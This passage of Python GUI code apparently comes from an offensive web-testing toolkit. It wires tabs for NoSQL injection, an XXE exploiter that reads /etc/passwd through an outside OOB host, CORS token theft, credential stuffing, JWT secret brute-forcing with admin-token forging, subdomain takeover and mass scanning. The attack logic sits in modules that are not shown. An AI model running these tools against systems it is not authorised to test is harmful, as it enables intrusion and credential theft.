        if extra_fields:
            for lbl, key, default in extra_fields:
                r = mk_frame(pad, bg=BG2); r.pack(fill='x', pady=(0,4))
                tk.Label(r, text=lbl, bg=BG2, fg=FG3, font=MONO_S, width=14, anchor='e').pack(side='left', padx=(0,8))
                v = tk.StringVar(value=default)
                mk_entry(r, var=v, w=40).pack(side='left', ipady=3)
                extra_vars[key] = v
        # ── Full Terminal widget ──────────────────────────────────
        term = Terminal(pad, height=18, title=title.split('—')[0].strip())
        term.pack(fill='both', expand=True, pady=(6,0))

        def log_fn(m, t='info'):
            """Log to Terminal widget (thread-safe)."""
            tag_map = {'ok':'ok','warn':'warn','err':'err','error':'err',
                       'info':'info','cmd':'cmd','dim':'dim'}
            tag = tag_map.get(t, 'default')
            try:
                self.root.after(0, lambda: term.log(m, tag))
            except Exception:
                pass

        def _run():
            url = url_var.get().strip()
            if not url:
                messagebox.showwarning("No Target",
                    "Enter a target URL first.\n\nExample: https://example.com",
                    parent=self.root)
                return
            if not url.startswith(('http://','https://')):
                url = 'https://' + url
                url_var.set(url)
            term.clear()
            term.log(f"[*] Starting: {title}", 'cmd')
            term.log(f"[*] Target: {url}", 'info')
            def _go():
                try:
                    result = run_fn(url, extra_vars, log_fn)
                    if result and result.get('vulnerable'):
                        def _save():
                            proj = self.project.get() or (url.split('/')[2] if '/' in url else 'target')
                            save_finding({
                                "title":       f"{title.split('—')[0].strip()} — {url}",
                                "url":         url, "type": title,
                                "severity":    "HIGH", "cvss_score": "7.5",
                                "description": f"{len(result.get('findings',[]))} issue(s) found",
                                "project":     proj, "tool": title, "status": "Open"
                            })
                            self._refresh_findings()
                            log_fn("[✓] Finding saved to Findings tab!", "ok")
                        self.root.after(0, _save)
                    elif result and not result.get('vulnerable'):
                        log_fn("[✓] Scan complete — no issues found", "ok")
                except Exception as ex:
                    log_fn(f"[!] Error: {ex}", "err")
            threading.Thread(target=_go, daemon=True).start()

        bf = mk_frame(pad, bg=BG2); bf.pack(fill='x', pady=(4,0))
        mk_btn(bf, btn_label, _run, btn_color or ACCENT).pack(side='left', ipady=5, padx=(0,8))
        mk_btn(bf, "■ Stop", term.stop, RED, small=True).pack(side='left', padx=4)
        mk_btn(bf, "🗑 Clear", term.clear, FG3, small=True).pack(side='left', padx=4)
        mk_btn(bf, "📋 Copy", lambda: (
            self.root.clipboard_clear(),
            self.root.clipboard_append(term.txt.get('1.0','end')),
            self.root.update()), FG2, small=True).pack(side='left', padx=4)
        return url_var, extra_vars, log_fn

    # ═════════════════════════════════════════════════════════════
    #  WEB SCANNER TABS
    # ═════════════════════════════════════════════════════════════
    def _build_proto_tab(self, frame):
        from modules.advanced.web_scanners import scan_prototype_pollution as _fn
        self._mk_scanner_tab(frame,
            "PROTOTYPE POLLUTION SCANNER",
            ["Detects __proto__ / constructor.prototype injection in JSON APIs",
             "Tests both GET params and POST body injection",
             "Server-side (Node.js) prototype pollution → RCE possible"],
            lambda url, ev, log: _fn(url, log_cb=log),
            btn_color=PURPLE)

    def _build_cache_tab(self, frame):
        from modules.advanced.web_scanners import scan_cache_poisoning as _fn
        self._mk_scanner_tab(frame,
            "CACHE POISONING TESTER",
            ["Tests unkeyed headers: X-Forwarded-Host, X-Host, X-Forwarded-Server...",
             "Fat GET parameter injection into cache key",
             "Reflected headers in response = cache poisoning vector"],
            lambda url, ev, log: _fn(url, log_cb=log),
            btn_color=ORANGE)

    def _build_cors_tab(self, frame):
        from modules.advanced.web_scanners import scan_cors as _fn
        self._mk_scanner_tab(frame,
            "CORS FULL EXPLOIT CHAIN",
            ["Tests: wildcard *, reflected origin, null origin bypass",
             "Checks Access-Control-Allow-Credentials: true (CRITICAL when combined)",
             "Generated exploit: steal auth tokens from victim browser"],
            lambda url, ev, log: _fn(url, log_cb=log),
            btn_color=CYAN)

    def _build_redirect_tab(self, frame):
        from modules.advanced.web_scanners import scan_open_redirect as _fn
        self._mk_scanner_tab(frame,
            "OPEN REDIRECT SCANNER",
            ["Tests 18 redirect params × 14 bypass techniques",
             "URL encoding, path confusion, protocol bypass (javascript:, data:)",
             "Redirect confirmed = open redirect vulnerability"],
            lambda url, ev, log: _fn(url, log_cb=log),
            btn_color=YELLOW)

    def _build_nosql_tab(self, frame):
        from modules.advanced.web_scanners import scan_nosql as _fn
        frame.configure(bg=BG2)
        url_var, ev, log_fn = self._mk_scanner_tab(frame,
            "NOSQL INJECTION FULL SUITE",
            ["MongoDB $ne/$gt/$regex login bypass",
             "Time-based blind NoSQL injection detection",
             "Data extraction via $or, $in, $where operators"],
            lambda url, extra, log: _fn(url, extra.get('ep',tk.StringVar(value='/api/login')).get(), log_cb=log),
            extra_fields=[("API Endpoint:","ep","/api/login")],
            btn_color=RED)

    def _build_ws_tab(self, frame):
        from modules.advanced.web_scanners import test_websocket as _fn
        frame.configure(bg=BG2)
        pad = mk_frame(frame, bg=BG2); pad.pack(fill='both', expand=True, padx=16, pady=12)
        mk_section(pad, "WEBSOCKET SECURITY TESTER", "🔌").pack(fill='x', pady=(0,8))
        crd = mk_card(pad, accent_top=True, accent_color=CYAN); crd.pack(fill='x', pady=(0,10))
        for line in ["WebSocket CSWSH (Cross-Site WebSocket Hijacking)",
                     "Message injection: SQLi, XSS, prototype pollution, NoSQL",
                     "Error/info leakage in WS responses"]:
            tk.Label(crd, text=f"  {line}", bg=BG3, fg=FG2, font=MONO_S).pack(anchor='w', padx=4, pady=1)
        tk.Frame(crd, height=4, bg=BG3).pack()
        r1 = mk_frame(pad, bg=BG2); r1.pack(fill='x', pady=(0,6))
        tk.Label(r1, text="WebSocket URL:", bg=BG2, fg=FG3, font=MONO_S, width=14, anchor='e').pack(side='left', padx=(0,8))
        ws_var = tk.StringVar(value=f"wss://{self.project.get()}/ws" if self.project.get() else "")
        mk_entry(r1, var=ws_var, w=48).pack(side='left', ipady=3)
        log_txt = mk_stext(pad, h=18, bg=TERM_BG, fg=TERM_FG)
        log_txt.pack(fill='both', expand=True, pady=(8,0))
        def log_fn(m, t='info'):
            clr = {'ok':GREEN,'warn':YELLOW,'err':RED,'info':CYAN,'dim':FG3}.get(t,FG)
            log_txt.config(state='normal'); log_txt.insert('end',m+'\n',t)
            log_txt.tag_config(t, foreground=clr, font=(_MONO_FACE,9))
            log_txt.see('end'); log_txt.config(state='disabled')
        def _run():
            url = ws_var.get().strip()
            if not url:
                messagebox.showwarning("No Target", "Enter a WebSocket URL first.\nExample: wss://example.com/ws", parent=self.root); return
            log_txt.config(state='normal'); log_txt.delete('1.0','end')
            log_txt.config(state='disabled')
            threading.Thread(target=lambda: _fn(url, log_cb=log_fn), daemon=True).start()
        mk_btn(pad, "🔌 Test WebSocket", _run, CYAN).pack(anchor='w', pady=(8,0), ipady=5)

    def _build_xxe_tab(self, frame):
        from modules.advanced.web_scanners import scan_xxe as _fn
        frame.configure(bg=BG2)
        url_var, ev, log_fn = self._mk_scanner_tab(frame,
            "XXE AUTO-EXPLOITER (OOB + SSRF)",
            ["File read: /etc/passwd, /windows/win.ini, PHP filter",
             "OOB DNS/HTTP via OAST (set OAST host for blind XXE)",
             "Billion laughs DoS, SSRF via XXE"],
            lambda url, extra, log: _fn(url, extra.get('oast',tk.StringVar()).get(), log_cb=log),
            extra_fields=[("OAST Host:","oast","your-vps.com:8877")],
            btn_color=RED)

    # ═════════════════════════════════════════════════════════════
    #  INTEL TOOL TABS
    # ═════════════════════════════════════════════════════════════
    def _build_s3_tab(self, frame):
        from modules.advanced.recon_tools import find_s3_buckets as _fn
        frame.configure(bg=BG2)
        pad = mk_frame(frame, bg=BG2); pad.pack(fill='both', expand=True, padx=16, pady=12)
        mk_section(pad, "S3 BUCKET FINDER + TESTER", "🪣").pack(fill='x', pady=(0,8))
        crd = mk_card(pad, accent_top=True, accent_color=YELLOW); crd.pack(fill='x', pady=(0,10))
        for line in ["20 naming permutations: company-backup, company-dev, company-assets...",
                     "PUBLIC bucket = full data access · EXISTS (403) = misconfigured permissions",
                     "Tests s3.amazonaws.com + bucket.s3.amazonaws.com patterns"]:
            tk.Label(crd, text=f"  {line}", bg=BG3, fg=FG2, font=MONO_S).pack(anchor='w', padx=4, pady=1)
        tk.Frame(crd, height=4, bg=BG3).pack()
        r1 = mk_frame(pad, bg=BG2); r1.pack(fill='x', pady=(0,6))
        tk.Label(r1, text="Company Name:", bg=BG2, fg=FG3, font=MONO_S, width=14, anchor='e').pack(side='left', padx=(0,8))
        cn_var = tk.StringVar(value=self.project.get() or "")
        mk_entry(r1, var=cn_var, w=32).pack(side='left', ipady=3)
        log_txt = mk_stext(pad, h=18, bg=TERM_BG, fg=TERM_FG)
        log_txt.pack(fill='both', expand=True, pady=(8,0))
        def log_fn(m,t='info'):
            clr = {'ok':GREEN,'warn':YELLOW,'err':RED,'info':CYAN,'dim':FG3}.get(t,FG)
            log_txt.config(state='normal'); log_txt.insert('end',m+'\n',t)
            log_txt.tag_config(t, foreground=clr, font=(_MONO_FACE,9))
            log_txt.see('end'); log_txt.config(state='disabled')
        def _run():
            name = cn_var.get().strip()
            if not name: return
            log_txt.config(state='normal'); log_txt.delete('1.0','end'); log_txt.config(state='disabled')
            def _go():
                r = _fn(name, log_cb=log_fn)
                if r.get('total',0) > 0:
                    self.root.after(0, lambda: (
                        save_finding({"title":f"S3 Buckets found for {name}",
                                      "url":f"https://{name}.s3.amazonaws.com",
                                      "type":"Cloud Misconfiguration","severity":"HIGH","cvss_score":"7.5",
                                      "description":f"{r['total']} S3 buckets found",
                                      "project":self.project.get() or name,"tool":"S3 Scanner","status":"Open"}),
                        self._refresh_findings(),
                        log_fn("[✓] Finding saved!", "ok")))
            threading.Thread(target=_go, daemon=True).start()
        mk_btn(pad, "🪣 Find S3 Buckets", _run, YELLOW).pack(anchor='w', pady=(8,0), ipady=5)

    def _build_tko_tab(self, frame):
        from modules.advanced.recon_tools import check_subdomain_takeover as _fn
        frame.configure(bg=BG2)
        pad = mk_frame(frame, bg=BG2); pad.pack(fill='both', expand=True, padx=16, pady=12)
        mk_section(pad, "SUBDOMAIN TAKEOVER LIVE CHECKER", "🏴").pack(fill='x', pady=(0,8))
        crd = mk_card(pad, accent_top=True, accent_color=RED); crd.pack(fill='x', pady=(0,10))
        for line in ["20+ service signatures: GitHub Pages, Heroku, Shopify, Azure, AWS S3...",
                     "NXDOMAIN + CNAME = potential takeover opportunity",
                     "Concurrent threads for fast scanning of large subdomain lists"]:
            tk.Label(crd, text=f"  {line}", bg=BG3, fg=FG2, font=MONO_S).pack(anchor='w', padx=4, pady=1)
        tk.Frame(crd, height=4, bg=BG3).pack()
        r1 = mk_frame(pad, bg=BG2); r1.pack(fill='x', pady=(0,6))
        tk.Label(r1, text="Subdomains file:", bg=BG2, fg=FG3, font=MONO_S, width=15, anchor='e').pack(side='left', padx=(0,8))
        sf_var = tk.StringVar()
        mk_entry(r1, var=sf_var, w=42).pack(side='left', ipady=3)
        def _browse():
            p = filedialog.askopenfilename(filetypes=[("Text","*.txt"),("All","*.*")])
            if p: sf_var.set(p)
        def _load_proj():
            proj = self.project.get()
            for fname in ["subdomains_all.txt","subfinder.txt","amass.txt"]:
                fp = LOGS_DIR / proj / fname
                if fp.exists(): sf_var.set(str(fp)); return
        mk_btn(r1, "📂", _browse, FG2, small=True).pack(side='left', padx=4)
        mk_btn(r1, "← Project", _load_proj, FG3, small=True).pack(side='left', padx=4)
        log_txt = mk_stext(pad, h=18, bg=TERM_BG, fg=TERM_FG)
        log_txt.pack(fill='both', expand=True, pady=(8,0))
        def log_fn(m,t='info'):
            clr = {'ok':GREEN,'warn':YELLOW,'err':RED,'info':CYAN,'dim':FG3}.get(t,FG)
            log_txt.config(state='normal'); log_txt.insert('end',m+'\n',t)
            log_txt.tag_config(t, foreground=clr, font=(_MONO_FACE,9))
            log_txt.see('end'); log_txt.config(state='disabled')
        def _run():
            fp = sf_var.get().strip()
            if not fp or not os.path.isfile(fp): messagebox.showwarning("File","Select a subdomains file",parent=self.root); return
            subs = [l.strip() for l in open(fp,errors='replace') if l.strip()]
            log_txt.config(state='normal'); log_txt.delete('1.0','end'); log_txt.config(state='disabled')
            def _go():
                r = _fn(subs, log_cb=log_fn)
                if r.get('count',0) > 0:
                    self.root.after(0, lambda: (
                        save_finding({"title":f"Subdomain Takeover: {r['count']} vulnerable",
                                      "url":"","type":"Subdomain Takeover","severity":"HIGH","cvss_score":"8.0",
                                      "description":str(r['vulnerable']),
                                      "project":self.project.get() or "target","tool":"Takeover Scanner","status":"Open"}),
                        self._refresh_findings(),
                        log_fn("[✓] Finding saved!", "ok")))
            threading.Thread(target=_go, daemon=True).start()
        mk_btn(pad, "🏴 Check Takeovers", _run, RED).pack(anchor='w', pady=(8,0), ipady=5)

    def _build_param_tab(self, frame):
        from modules.advanced.recon_tools import mine_parameters as _fn
        self._mk_scanner_tab(frame,
            "PARAMETER MINING (JS + Wayback + HTML)",
            ["Extracts params from URL, JS code, HTML forms, and Wayback URLs",
             "Flags interesting params: id, user, admin, token, key, file, redirect...",
             "Found params → use with SQLi/XSS/SSRF testing"],
            lambda url, ev, log: _fn(url, log_cb=log),
            btn_color=CYAN)

    def _build_cred_tab(self, frame):
        from modules.advanced.recon_tools import credential_stuff as _fn
        frame.configure(bg=BG2)
        url_var, ev, log_fn = self._mk_scanner_tab(frame,
            "CREDENTIAL STUFFING ENGINE",
            ["Tests 24+ default credential pairs against login endpoints",
             "Configurable: username field, password field, success indicator",
             "Built-in list + custom cred file support"],
            lambda url, extra, log: _fn(
                url,
                extra.get('uf',tk.StringVar(value='username')).get(),
                extra.get('pf',tk.StringVar(value='password')).get(),
                extra.get('si',tk.StringVar(value='dashboard')).get(),
                log_cb=log),
            extra_fields=[
                ("Username Field:","uf","username"),
                ("Password Field:","pf","password"),
                ("Success String:","si","dashboard"),
            ],
            btn_color=RED)

    def _build_jwt_wl_tab(self, frame):
        from modules.advanced.recon_tools import brute_jwt_secret as _fn
        frame.configure(bg=BG2)
        pad = mk_frame(frame, bg=BG2); pad.pack(fill='both', expand=True, padx=16, pady=12)
        mk_section(pad, "JWT SECRET WORDLIST BRUTE-FORCER", "🔐").pack(fill='x', pady=(0,8))
        crd = mk_card(pad, accent_top=True, accent_color=YELLOW); crd.pack(fill='x', pady=(0,10))
        for line in ["100+ common JWT secrets: 'secret', 'password', 'jwt-secret', 'SECRET_KEY'...",
                     "Also loads from project wordlists/passwords.txt automatically",
                     "Supports HS256 / HS384 / HS512 — found secret auto-generates admin token"]:
            tk.Label(crd, text=f"  {line}", bg=BG3, fg=FG2, font=MONO_S).pack(anchor='w', padx=4, pady=1)
        tk.Frame(crd, height=4, bg=BG3).pack()
        r1 = mk_frame(pad, bg=BG2); r1.pack(fill='x', pady=(0,6))
        tk.Label(r1, text="JWT Token:", bg=BG2, fg=FG3, font=MONO_S, width=13, anchor='e').pack(side='left', padx=(0,8))
        jwt_var = tk.StringVar()
        mk_entry(r1, var=jwt_var, w=62).pack(side='left', ipady=3, fill='x', expand=True)
        log_txt = mk_stext(pad, h=18, bg=TERM_BG, fg=TERM_FG)
        log_txt.pack(fill='both', expand=True, pady=(8,0))
        def log_fn(m,t='info'):
            clr = {'ok':GREEN,'warn':YELLOW,'err':RED,'info':CYAN,'dim':FG3}.get(t,FG)
            log_txt.config(state='normal'); log_txt.insert('end',m+'\n',t)
            log_txt.tag_config(t, foreground=clr, font=(_MONO_FACE,9))
            log_txt.see('end'); log_txt.config(state='disabled')
        def _run():
            token = jwt_var.get().strip()
            if not token: messagebox.showwarning("Token","Paste a JWT token first",parent=self.root); return
            log_txt.config(state='normal'); log_txt.delete('1.0','end'); log_txt.config(state='disabled')
            def _go():
                r = _fn(token, log_cb=log_fn)
                if r.get('found'):
                    self.root.after(0, lambda s=r['found']: (
                        log_fn(f"\n[!] SECRET: {s!r}", "ok"),
                        log_fn(f"[*] Now use JWT tab → Forge Payload with this secret", "info")))
            threading.Thread(target=_go, daemon=True).start()
        mk_btn(pad, "🔐 Brute-Force JWT Secret", _run, YELLOW).pack(anchor='w', pady=(8,0), ipady=5)

    # ═════════════════════════════════════════════════════════════
    #  ANALYSIS/INTEL TABS
    # ═════════════════════════════════════════════════════════════
    def _build_shodan_exploit_tab(self, frame):
        from modules.advanced.intel_tools import shodan_auto_exploit as _fn
        frame.configure(bg=BG2)
        pad = mk_frame(frame, bg=BG2); pad.pack(fill='both', expand=True, padx=16, pady=12)
        mk_section(pad, "SHODAN AUTO-EXPLOIT — Service Detection", "🔭").pack(fill='x', pady=(0,8))
        crd = mk_card(pad, accent_top=True, accent_color=RED); crd.pack(fill='x', pady=(0,10))
        for line in ["Checks: Elasticsearch, MongoDB, Redis, Jenkins, Docker API, K8s API...",
                     "No Shodan API key needed — direct probes to target host",
                     "With API key: enriched with Shodan intelligence data"]:
            tk.Label(crd, text=f"  {line}", bg=BG3, fg=FG2, font=MONO_S).pack(anchor='w', padx=4, pady=1)
        tk.Frame(crd, height=4, bg=BG3).pack()
        r1 = mk_frame(pad, bg=BG2); r1.pack(fill='x', pady=(0,6))
        tk.Label(r1, text="Target IP/Host:", bg=BG2, fg=FG3, font=MONO_S, width=15, anchor='e').pack(side='left', padx=(0,8))
        ip_var = tk.StringVar(value=self.project.get() or "")
        mk_entry(r1, var=ip_var, w=32).pack(side='left', ipady=3)
        r2 = mk_frame(pad, bg=BG2); r2.pack(fill='x', pady=(0,6))
        tk.Label(r2, text="Shodan API Key:", bg=BG2, fg=FG3, font=MONO_S, width=15, anchor='e').pack(side='left', padx=(0,8))
        try: shodan_key = load_cfg().get("api_keys",{}).get("shodan","")
        except Exception: shodan_key = ""
        sk_var = tk.StringVar(value=shodan_key)
        mk_entry(r2, var=sk_var, w=32, show="●").pack(side='left', ipady=3)
        log_txt = mk_stext(pad, h=18, bg=TERM_BG, fg=TERM_FG)
        log_txt.pack(fill='both', expand=True, pady=(8,0))
        def log_fn(m,t='info'):
            clr = {'ok':GREEN,'warn':YELLOW,'err':RED,'info':CYAN,'dim':FG3}.get(t,FG)
            log_txt.config(state='normal'); log_txt.insert('end',m+'\n',t)
            log_txt.tag_config(t, foreground=clr, font=(_MONO_FACE,9))
            log_txt.see('end'); log_txt.config(state='disabled')
        def _run():
            ip = ip_var.get().strip()
            if not ip: return
            log_txt.config(state='normal'); log_txt.delete('1.0','end'); log_txt.config(state='disabled')
            def _go():
                r = _fn(ip, sk_var.get().strip(), log_cb=log_fn)
                if r.get('findings'):
                    for finding in r['findings']:
                        self.root.after(0, lambda f=finding, h=ip: (
                            save_finding({"title":f.get('description','Service exposed'),
                                          "url":f.get('url',''), "type":"Service Exposure",
                                          "severity":f.get('severity','HIGH'),"cvss_score":"7.5",
                                          "project":self.project.get() or h,"tool":"Shodan Exploit","status":"Open"}),
                            self._refresh_findings()))
                    self.root.after(0, lambda: log_fn(f"[✓] {len(r['findings'])} findings saved!", "ok"))
            threading.Thread(target=_go, daemon=True).start()
        mk_btn(pad, "🔭 Run Shodan Exploit", _run, RED).pack(anchor='w', pady=(8,0), ipady=5)

    def _build_mass_scan_tab(self, frame):
        from modules.advanced.intel_tools import mass_scan as _fn
        frame.configure(bg=BG2)
        pad = mk_frame(frame, bg=BG2); pad.pack(fill='both', expand=True, padx=16, pady=12)
        mk_section(pad, "MASS VULNERABILITY SCANNER — Multi-Target", "🎯").pack(fill='x', pady=(0,8))
        crd = mk_card(pad, accent_top=True, accent_color=ORANGE); crd.pack(fill='x', pady=(0,10))
        for line in ["16 checks per target: .env, .git, admin panel, phpMyAdmin, debug mode...",
                     "Enter multiple targets (one per line) for bulk scanning",
                     "All findings auto-saved to Findings tab"]:
            tk.Label(crd, text=f"  {line}", bg=BG3, fg=FG2, font=MONO_S).pack(anchor='w', padx=4, pady=1)
        tk.Frame(crd, height=4, bg=BG3).pack()
        r1 = mk_frame(pad, bg=BG2); r1.pack(fill='x', pady=(0,6))
        tk.Label(r1, text="Targets:", bg=BG2, fg=FG3, font=MONO_S).pack(anchor='w')
        tgt_txt = tk.Text(pad, height=5, bg=BG3, fg=FG, font=MONO_S,
                          relief='flat', bd=0, insertbackground=ACCENT, padx=8, pady=6,
                          highlightthickness=1, highlightbackground=BORDER2)
        tgt_txt.pack(fill='x', pady=(4,8))
        tgt_txt.insert('end', f"https://{self.project.get()}\n" if self.project.get() else "")
        log_txt = mk_stext(pad, h=14, bg=TERM_BG, fg=TERM_FG)
        log_txt.pack(fill='both', expand=True, pady=(0,8))
        def log_fn(m,t='info'):
            clr = {'ok':GREEN,'warn':YELLOW,'err':RED,'info':CYAN,'dim':FG3}.get(t,FG)
            log_txt.config(state='normal'); log_txt.insert('end',m+'\n',t)
            log_txt.tag_config(t, foreground=clr, font=(_MONO_FACE,9))
            log_txt.see('end'); log_txt.config(state='disabled')
        def _run():
            targets = [l.strip() for l in tgt_txt.get('1.0','end').splitlines() if l.strip()]
            if not targets: return
            log_txt.config(state='normal'); log_txt.delete('1.0','end'); log_txt.config(state='disabled')
            def _go():
                r = _fn(targets, log_cb=log_fn)
                for tgt, findings in r.get('results',{}).items():
                    for f in findings:
                        save_finding({"title":f['check'],"url":f['url'],
                                      "type":"Misconfiguration","severity":f['severity'],"cvss_score":"6.5",
                                      "project":self.project.get() or tgt,"tool":"Mass Scanner","status":"Open"})
                self.root.after(0, lambda: (
                    self._refresh_findings(),
                    log_fn(f"\n[✓] {r.get('total',0)} findings saved!", "ok")))
            threading.Thread(target=_go, daemon=True).start()
        mk_btn(pad, "🎯 Start Mass Scan", _run, ORANGE).pack(anchor='w', pady=(0,0), ipady=5)

    def _build_sast_tab(self, frame):
        from modules.advanced.intel_tools import analyze_source_code, analyze_github_repo
        frame.configure(bg=BG2)
        nb2 = ttk.Notebook(frame); nb2.pack(fill='both', expand=True)
        f1 = tk.Frame(nb2, bg=BG2); nb2.add(f1, text="  📝 Paste Code  ")
        f2 = tk.Frame(nb2, bg=BG2); nb2.add(f2, text="  🐙 GitHub Repo  ")

        # Paste code tab
        p1 = mk_frame(f1, bg=BG2); p1.pack(fill='both', expand=True, padx=16, pady=12)
        mk_section(p1, "SOURCE CODE SAST — Paste Any Code", "📝").pack(fill='x', pady=(0,8))
        tk.Label(p1, text="Paste source code:", bg=BG2, fg=FG3, font=MONO_S).pack(anchor='w', pady=(0,4))
        code_txt = tk.Text(p1, height=10, bg=BG3, fg=FG, font=(_MONO_FACE,9),
                           relief='flat', bd=0, insertbackground=ACCENT, padx=8, pady=6,
                           highlightthickness=1, highlightbackground=BORDER2)
        code_txt.pack(fill='x', pady=(0,8))
        sast_log = mk_stext(p1, h=12, bg=TERM_BG, fg=TERM_FG)
        sast_log.pack(fill='both', expand=True)
        def log1(m,t='info'):
            clr = {'ok':GREEN,'warn':YELLOW,'err':RED,'info':CYAN,'dim':FG3}.get(t,FG)
            sast_log.config(state='normal'); sast_log.insert('end',m+'\n',t)
            sast_log.tag_config(t, foreground=clr, font=(_MONO_FACE,9))
            sast_log.see('end'); sast_log.config(state='disabled')
        fn_var1 = tk.StringVar(value="pasted_code.py")
        r_fn = mk_frame(p1, bg=BG2); r_fn.pack(fill='x', pady=(8,0))
        tk.Label(r_fn, text="Filename:", bg=BG2, fg=FG3, font=MONO_S).pack(side='left')
        mk_entry(r_fn, var=fn_var1, w=24).pack(side='left', padx=8, ipady=3)
        def _run1():
            code = code_txt.get('1.0','end')
            if not code.strip(): return
            sast_log.config(state='normal'); sast_log.delete('1.0','end'); sast_log.config(state='disabled')
            threading.Thread(target=lambda: analyze_source_code(code, fn_var1.get(), log1), daemon=True).start()
        mk_btn(r_fn, "🔬 Analyze", _run1, PURPLE, small=True).pack(side='left', padx=4)

        # GitHub repo tab
        p2 = mk_frame(f2, bg=BG2); p2.pack(fill='both', expand=True, padx=16, pady=12)
        mk_section(p2, "GITHUB REPO SAST SCANNER", "🐙").pack(fill='x', pady=(0,8))
        r3 = mk_frame(p2, bg=BG2); r3.pack(fill='x', pady=(0,6))
        tk.Label(r3, text="GitHub Repo URL:", bg=BG2, fg=FG3, font=MONO_S, width=16, anchor='e').pack(side='left', padx=(0,8))
        repo_var = tk.StringVar(value="https://github.com/owner/repo")
        mk_entry(r3, var=repo_var, w=50).pack(side='left', ipady=3)
        r4 = mk_frame(p2, bg=BG2); r4.pack(fill='x', pady=(0,6))
        tk.Label(r4, text="GitHub Token:", bg=BG2, fg=FG3, font=MONO_S, width=16, anchor='e').pack(side='left', padx=(0,8))
        try: gh_key = load_cfg().get("api_keys",{}).get("github_token","")
        except Exception: gh_key = ""
        gh_var = tk.StringVar(value=gh_key)
        mk_entry(r4, var=gh_var, w=46, show="●").pack(side='left', ipady=3)
        sast_log2 = mk_stext(p2, h=16, bg=TERM_BG, fg=TERM_FG)
        sast_log2.pack(fill='both', expand=True, pady=(8,0))
        def log2(m,t='info'):
            clr = {'ok':GREEN,'warn':YELLOW,'err':RED,'info':CYAN,'dim':FG3}.get(t,FG)
            sast_log2.config(state='normal'); sast_log2.insert('end',m+'\n',t)
            sast_log2.tag_config(t, foreground=clr, font=(_MONO_FACE,9))
            sast_log2.see('end'); sast_log2.config(state='disabled')
        def _run2():
            repo = repo_var.get().strip()
            if not repo: return
            sast_log2.config(state='normal'); sast_log2.delete('1.0','end'); sast_log2.config(state='disabled')
            def _go():
                r = analyze_github_repo(repo, gh_var.get().strip(), log2)
                if r.get('total',0) > 0:
                    self.root.after(0, lambda: (
                        save_finding({"title":f"Secrets in GitHub repo: {repo.split('/')[-1]}",
                                      "url":repo,"type":"Secret Exposure","severity":"CRITICAL","cvss_score":"9.0",
                                      "description":f"{r['total']} secrets/vulns found in {r.get('files_scanned',0)} files",
                                      "project":self.project.get() or "target","tool":"SAST","status":"Open"}),
                        self._refresh_findings(),
                        log2("[✓] Finding saved!", "ok")))
            threading.Thread(target=_go, daemon=True).start()
        mk_btn(p2, "🐙 Scan GitHub Repo", _run2, PURPLE).pack(anchor='w', pady=(8,0), ipady=5)

    def _build_api_swagger_tab(self, frame):
        from modules.advanced.intel_tools import parse_swagger, test_api_endpoint
        frame.configure(bg=BG2)
        pad = mk_frame(frame, bg=BG2); pad.pack(fill='both', expand=True, padx=16, pady=12)
        mk_section(pad, "API SECURITY TESTER — Swagger / OpenAPI Import", "🔗").pack(fill='x', pady=(0,8))
        crd = mk_card(pad, accent_top=True, accent_color=CYAN); crd.pack(fill='x', pady=(0,8))
        for line in ["Import Swagger/OpenAPI spec from URL or JSON",
                     "Auto-tests each endpoint: auth bypass, IDOR, method override",
                     "Extracts all endpoints with methods, params, auth requirements"]:
            tk.Label(crd, text=f"  {line}", bg=BG3, fg=FG2, font=MONO_S).pack(anchor='w', padx=4, pady=1)
        tk.Frame(crd, height=4, bg=BG3).pack()
        r1 = mk_frame(pad, bg=BG2); r1.pack(fill='x', pady=(0,6))
        tk.Label(r1, text="Swagger URL:", bg=BG2, fg=FG3, font=MONO_S, width=13, anchor='e').pack(side='left', padx=(0,8))
        sw_var = tk.StringVar(value=f"https://{self.project.get()}/swagger.json" if self.project.get() else "")
        mk_entry(r1, var=sw_var, w=50).pack(side='left', ipady=3)
        r2 = mk_frame(pad, bg=BG2); r2.pack(fill='x', pady=(0,6))
        tk.Label(r2, text="Auth Header:", bg=BG2, fg=FG3, font=MONO_S, width=13, anchor='e').pack(side='left', padx=(0,8))
        auth_var = tk.StringVar(value="Bearer YOUR_TOKEN")
        mk_entry(r2, var=auth_var, w=44).pack(side='left', ipady=3)

        # Endpoints tree
        ep_cols = ('Method','Path','Auth','Params')
        self._api_ep_tree = mk_tree(pad, columns=ep_cols, show='headings', height=10)
        for c,w in [('Method',60),('Path',280),('Auth',50),('Params',80)]:
            self._api_ep_tree.heading(c, text=c, anchor='w')
            self._api_ep_tree.column(c, width=w, anchor='w')
        self._api_ep_tree.tag_configure('GET',    foreground=GREEN, background=BG3)
        self._api_ep_tree.tag_configure('POST',   foreground=YELLOW, background=BG3)
        self._api_ep_tree.tag_configure('DELETE', foreground=RED, background=BG3)
        vsb_ep = ttk.Scrollbar(pad, orient='vertical', command=self._api_ep_tree.yview)
        self._api_ep_tree.configure(yscrollcommand=vsb_ep.set)
        tf_ep = mk_frame(pad, bg=BG2); tf_ep.pack(fill='x')
        self._api_ep_tree.pack(side='left', fill='x', expand=True, in_=tf_ep)
        vsb_ep.pack(side='right', fill='y', in_=tf_ep)

        api_log = mk_stext(pad, h=10, bg=TERM_BG, fg=TERM_FG)
        api_log.pack(fill='both', expand=True, pady=(8,0))
        self._api_spec = None

        def log_fn(m,t='info'):
            clr = {'ok':GREEN,'warn':YELLOW,'err':RED,'info':CYAN,'dim':FG3}.get(t,FG)
            api_log.config(state='normal'); api_log.insert('end',m+'\n',t)
            api_log.tag_config(t, foreground=clr, font=(_MONO_FACE,9))
            api_log.see('end'); api_log.config(state='disabled')

        def _load():
            url = sw_var.get().strip()
            if not url: return
            def _go():
                spec = parse_swagger(url, log_fn)
                if spec:
                    self._api_spec = spec
                    def _upd():
                        self._api_ep_tree.delete(*self._api_ep_tree.get_children())
                        for ep in spec.get('endpoints',[]):
                            m = ep['method']
                            self._api_ep_tree.insert('','end',
                                values=(m, ep['path'], "🔒" if ep['auth'] else "🔓",
                                        len(ep.get('params',[]))),
                                tags=(m,))
                        log_fn(f"[✓] {spec['total']} endpoints loaded", "ok")
                    self.root.after(0, _upd)
            threading.Thread(target=_go, daemon=True).start()

        def _test_all():
            if not self._api_spec: messagebox.showwarning("Load First","Load Swagger spec first",parent=self.root); return
            def _go():
                for ep in self._api_spec.get('endpoints',[])[:20]:
                    results = test_api_endpoint(ep, auth_var.get().strip(), log_fn)
                    for r in results:
                        save_finding({"title":r.get('type','API Issue'), "url":r.get('url',''),
                                      "type":"API Security","severity":"HIGH","cvss_score":"7.5",
